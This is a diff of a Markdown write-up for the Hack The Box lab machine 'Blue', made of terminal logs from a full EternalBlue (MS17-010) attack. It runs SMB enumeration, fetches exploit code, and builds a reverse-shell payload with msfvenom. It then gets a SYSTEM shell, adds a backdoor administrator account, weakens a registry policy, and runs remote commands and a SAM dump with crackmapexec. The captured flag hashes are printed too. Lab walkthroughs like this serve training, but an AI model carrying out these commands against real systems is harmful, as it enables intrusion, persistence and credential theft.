@@ -15,7 +15,7 @@ rtt min/avg/max/mdev = 140.285/144.852/155.747/6.332 ms
 
 
 
-
+```console
 root@kali:~/HTB/BLUE# nmap -Pn -sT -n 10.10.10.40 --reason --max-retries 2 --min-rate 1000
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:27 CDT
 Warning: 10.10.10.40 giving up on port because retransmission cap hit (2).
@@ -35,10 +35,10 @@ PORT      STATE SERVICE      REASON
 49157/tcp open  unknown      syn-ack
 
 Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE# nmap -Pn -sT -sV -n 10.10.10.40 --reason -p 135,139,445,49152,49153,49154,49155,49156,49157
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:29 CDT
 Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -60,12 +60,12 @@ Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 63.14 seconds
-
+```
 
 
 Recon - TCP/445
 
-
+```console
 root@kali:~/HTB/BLUE# nmap -Pn -sT -n --script "vuln" 10.10.10.40 -p 135,139,445
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:38 CDT
 Pre-scan script results:
@@ -101,9 +101,9 @@ Host script results:
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
 Nmap done: 1 IP address (1 host up) scanned in 51.66 seconds
+```
 
-
-
+```console
 oot@kali:~/HTB/BLUE# nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:39 CDT
 Nmap scan report for 10.10.10.40
@@ -131,9 +131,9 @@ Host script results:
 |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
 
 Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE# nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
 Starting Nmap 7.70 ( https://nmap.org ) at 2021-04-28 19:41 CDT
 Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
@@ -177,10 +177,10 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 60.74 seconds
 root@kali:~/HTB/BLUE# 
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE# smbclient -L 10.10.10.40 -N 
 WARNING: The "syslog" option is deprecated
 
@@ -194,11 +194,11 @@ WARNING: The "syslog" option is deprecated
 Reconnecting with SMB1 for workgroup listing.
 Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Failed to connect with SMB1 -- no workgroup available
+```
 
 
 
-
-
+```console
 root@kali:~/HTB/BLUE# smbmap -H 10.10.10.40 -u 'null'
 [+] Finding open SMB ports....
 [+] Guest SMB session established on 10.10.10.40...
@@ -210,9 +210,9 @@ root@kali:~/HTB/BLUE# smbmap -H 10.10.10.40 -u 'null'
 	IPC$                                              	NO ACCESS
 	Share                                             	READ ONLY
 	Users                                             	READ ONLY
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE# smbclient //10.10.10.40/Users -N
 WARNING: The "syslog" option is deprecated
 Try "help" to get a list of possible commands.
@@ -225,25 +225,10 @@ smb: \> dir
 
 		8362495 blocks of size 4096. 4212135 blocks available
 smb: \> 
+```
 
 
-smb: \Public\> dir
-  .                                  DR        0  Tue Apr 12 02:51:29 2011
-  ..                                 DR        0  Tue Apr 12 02:51:29 2011
-  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
-  Documents                          DR        0  Tue Jul 14 00:08:56 2009
-  Downloads                          DR        0  Mon Jul 13 23:54:24 2009
-  Favorites                         DHR        0  Mon Jul 13 21:34:59 2009
-  Libraries                         DHR        0  Mon Jul 13 23:54:24 2009
-  Music                              DR        0  Mon Jul 13 23:54:24 2009
-  Pictures                           DR        0  Mon Jul 13 23:54:24 2009
-  Recorded TV                        DR        0  Tue Apr 12 02:51:29 2011
-  Videos                             DR        0  Mon Jul 13 23:54:24 2009
-
-		8362495 blocks of size 4096. 4212135 blocks available
-smb: \Public\> 
-
-
+```console
 smb: \> dir ../../../Public/
   .                                  DR        0  Tue Apr 12 02:51:29 2011
   ..                                 DR        0  Tue Apr 12 02:51:29 2011
@@ -257,7 +242,7 @@ smb: \> dir ../../../Public/
   Pictures                           DR        0  Mon Jul 13 23:54:24 2009
   Recorded TV                        DR        0  Tue Apr 12 02:51:29 2011
   Videos                             DR        0  Mon Jul 13 23:54:24 2009
-
+  
 		8362495 blocks of size 4096. 4212918 blocks available
 smb: \> dir ../../../Administrator
   Administrator                       D        0  Fri Jul 21 01:56:36 2017
@@ -266,11 +251,14 @@ smb: \> dir ../../../Administrator
 smb: \> dir ../../../Administrator/
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \Administrator\
 smb: \> 
+```
 
-
+```console
 root@kali:~/HTB/BLUE# mkdir smbFolder
 root@kali:~/HTB/BLUE# mount -t cifs //10.10.10.40/Users /root/HTB/BLUE/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
+```
 
+```console
 root@kali:~/HTB/BLUE/smbFolder# ls -la
 total 9
 drwxr-xr-x 2 root root 4096 jul 21  2017 .
@@ -278,10 +266,10 @@ drwxr-xr-x 3 root root 4096 abr 28 19:54 ..
 dr-xr-xr-x 2 root root    0 jul 14  2009 Default
 -rwxr-xr-x 1 root root  174 jul 13  2009 desktop.ini
 dr-xr-xr-x 2 root root    0 abr 12  2011 Public
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Desktop -N
 WARNING: The "syslog" option is deprecated
 REVISION:1
@@ -298,16 +286,16 @@ root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Des
 WARNING: The "syslog" option is deprecated
 ACL:Everyone:ALLOWED/I/READ
 ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/smbFolder/Default# smbcacls //10.10.10.40/Users Default/Desktop -N | grep Everyone
 WARNING: The "syslog" option is deprecated
 ACL:Everyone:ALLOWED/I/READ
 ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/smbFolder/Default# for ls in $(ls); do echo $ls; done | grep -v -i "ntuser" | while read line; do echo $line; smbcacls //10.10.10.40/Users Default/$line -N | grep -i everyone; done
 AppData
 WARNING: The "syslog" option is deprecated
@@ -350,12 +338,9 @@ WARNING: The "syslog" option is deprecated
 
 ACL:Everyone:ALLOWED/I/READ
 ACL:Everyone:ALLOWED/OI|CI|IO|I/0xa0000000
+```
 
-
-
-
-
-
+```console
 root@kali:~/HTB/BLUE# searchsploit eternalblue
 ---------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                    |  Path
@@ -378,15 +363,10 @@ root@kali:~/HTB/BLUE# searchsploit -x 42315
       URL: https://www.exploit-db.com/exploits/42315
      Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
 File Type: Python script, ASCII text executable, with CRLF line terminators
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE# searchsploit -x 42315
-
-
-
-
-
 root@kali:~/HTB/BLUE# searchsploit -m 42315
   Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
       URL: https://www.exploit-db.com/exploits/42315
@@ -394,11 +374,9 @@ root@kali:~/HTB/BLUE# searchsploit -m 42315
 File Type: Python script, ASCII text executable, with CRLF line terminators
 
 Copied to: /root/HTB/BLUE/42315.py
+```
 
-
-
-
-
+```console
 root@kali:~/HTB/BLUE# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
 --2021-04-28 20:18:16--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
 Resolviendo github.com (github.com)... 140.82.114.3
@@ -415,7 +393,9 @@ Grabando a: “mysmb.py”
 mysmb.py                              100%[======================================================================>]  16,28K  --.-KB/s    en 0s      
 
 2021-04-28 20:18:17 (32,2 MB/s) - “mysmb.py” guardado [16669/16669]
+```
 
+```console
 root@kali:~/HTB/BLUE# ls -la
 total 88
 drwxr-xr-x 3 root root  4096 abr 28 20:17 .
@@ -426,17 +406,18 @@ drwxr-xr-x 2 root root  4096 jul 21  2017 smbFolder
 -rw-r--r-- 1 root root     5 abr 28 19:50 smb_text.txt
 -rw-r--r-- 1 root root  1024 abr 28 19:24 .writeup.txt.swp
 root@kali:~/HTB/BLUE# 
+```
 
-
-
-
+```console
 oot@kali:~/HTB/BLUE# python 42315.py 10.10.10.40
 Target OS: Windows 7 Professional 7601 Service Pack 1
 Not found accessible named pipe
 Done
 root@kali:~/HTB/BLUE# 
+```
 
 
+```python
 
 '''
 
@@ -459,11 +440,9 @@ For Windows Vista and earlier, matched pair method is impossible because we cann
 smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But
 a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).
 Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment
+```
 
-
-
-
-
+```console
 root@kali:~/HTB/BLUE# python 42315.py 10.10.10.40
 Target OS: Windows 7 Professional 7601 Service Pack 1
 Using named pipe: samr
@@ -483,10 +462,9 @@ overwriting session security context
 creating file c:\pwned.txt on the target
 Done
 root@kali:~/HTB/BLUE#
+```
 
-
-
-
+```console
 root@kali:~/HTB/BLUE# msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -494,8 +472,9 @@ No encoder or badchars specified, outputting raw payload
 Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: exploit.exe
+```
 
-
+```console
 root@kali:~/HTB/BLUE# python 42315.py 10.10.10.40 samr exploit.exe 
 Target OS: Windows 7 Professional 7601 Service Pack 1
 Target is 64 bit
@@ -521,9 +500,9 @@ ServiceExec Error on: 10.10.10.40
 nca_s_proto_error
 Done
 root@kali:~/HTB/BLUE#
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE# nc -lvnp 4444
 listening on [any] 4444 ...
 
@@ -564,21 +543,23 @@ Tunnel adapter Teredo Tunneling Pseudo-Interface:
    Connection-specific DNS Suffix  . : 
 
 C:\Windows\system32>
+```
 
 
 
 
 
-
-
+```console
 root@kali:~/HTB/BLUE# git clone https://github.com/worawit/MS17-010.git
 Clonando en 'MS17-010'...
 remote: Enumerating objects: 183, done.
 remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
 Recibiendo objetos: 100% (183/183), 113.61 KiB | 548.00 KiB/s, listo.
 Resolviendo deltas: 100% (102/102), listo.
+```
 
 
+```console
 root@kali:~/HTB/BLUE/MS17-010# python checker.py 10.10.10.40
 Target OS: Windows 7 Professional 7601 Service Pack 1
 The target is not patched
@@ -589,11 +570,11 @@ samr: STATUS_ACCESS_DENIED
 netlogon: STATUS_ACCESS_DENIED
 lsarpc: STATUS_ACCESS_DENIED
 browser: STATUS_ACCESS_DENIED
+```
 
 
 
-
-
+```console
 root@kali:~/HTB/BLUE# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
 Clonando en 'AutoBlue-MS17-010'...
 remote: Enumerating objects: 126, done.
@@ -613,9 +594,9 @@ root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python eternal_checker.py 10.10.10.40
 === Testing named pipes ===
 [*] Done
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ls
 eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ./shell_prep.sh 
@@ -664,10 +645,10 @@ Saved as: sc_x86_msf.bin
 MERGING SHELLCODE WOOOO!!!
 DONE
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# 
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# ls -la
 total 88
 drwxr-xr-x 2 root root  4096 abr 28 20:34 .
@@ -684,10 +665,10 @@ drwxr-xr-x 4 root root  4096 abr 28 20:27 ..
 -rw-r--r-- 1 root root   324 abr 28 20:34 sc_x86_msf.bin
 -rwxr-xr-x 1 root root  4557 abr 28 20:26 shell_prep.sh
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010/shellcode# 
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 
 shellcode size: 1232
 numGroomConn: 13
@@ -697,9 +678,9 @@ SMB1 session setup allocate nonpaged pool success
 good response status: INVALID_PARAMETER
 done
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/smbFolder/Default# nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.28] from (UNKNOWN) [10.10.10.40] 49158
@@ -707,10 +688,10 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/smbFolder/Default# nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.28] from (UNKNOWN) [10.10.10.40] 49158
@@ -720,21 +701,12 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>net user admin admin /add
 net user admin admin /add
 The command completed successfully.
-
-
-C:\Windows\system32>whoami
-whoami
-nt authority\system
-
 C:\Windows\system32>net localgroup administrators admin /add
 net localgroup administrators admin /add
 The command completed successfully.
+```
 
-
-C:\Windows\system32>
-
-
-
+```console
 C:\Windows\system32>net users
 net users
 
@@ -747,8 +719,9 @@ The command completed with one or more errors.
 
 
 C:\Windows\system32>
+```
 
-
+```console
 C:\Windows\system32>net localgroup administrators
 net localgroup administrators
 Alias name     administrators
@@ -764,42 +737,42 @@ The command completed successfully.
 
 
 C:\Windows\system32>
+```
 
 
-
-
+```console
 C:\Users\haris\Desktop>type user.txt
 type user.txt
 4c546aea7dbee75cbd71de245c8deea9
 C:\Users\haris\Desktop>
+```
 
-
-
+```console
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 ff548eb71e920ff6c08843ce9df4e717
 C:\Users\Administrator\Desktop>
+```
 
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin'
 CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
 CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin 
 [*] KTHXBYE!
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# 
+```
 
 
-
-
+```console
 C:\Windows\system32>cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 The operation completed successfully.
 
 C:\Windows\system32>
+```
 
-
-
+```console
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
 CME          10.10.10.40:445 HARIS-PC        [*] Windows 6.1 Build 7601 (name:HARIS-PC) (domain:HARIS-PC)
 CME          10.10.10.40:445 HARIS-PC        [+] HARIS-PC\admin:admin (Pwn3d!)
@@ -807,6 +780,7 @@ CME          10.10.10.40:445 HARIS-PC        [+] Executed command
 CME          10.10.10.40:445 HARIS-PC        haris-pc\admin
 [*] KTHXBYE!
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010#
+```
 
 
 root@kali:~/HTB/BLUE/AutoBlue-MS17-010# crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
